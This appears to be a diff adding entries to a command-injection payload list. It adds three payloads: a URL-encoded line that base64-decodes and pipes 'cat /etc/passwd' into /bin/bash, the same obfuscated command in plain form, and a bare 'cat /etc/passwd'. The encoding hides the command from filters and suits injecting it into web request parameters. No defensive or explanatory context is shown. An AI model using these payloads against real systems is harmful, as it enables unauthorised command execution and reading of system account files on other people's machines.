@@ -1,0 +1,5 @@
+echo%20Y2F0IC9ldGMvcGFzc3dk%20|%20base64%20-d%20|%20/bin/bash
+
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | /bin/bash
+
+cat /etc/passwd
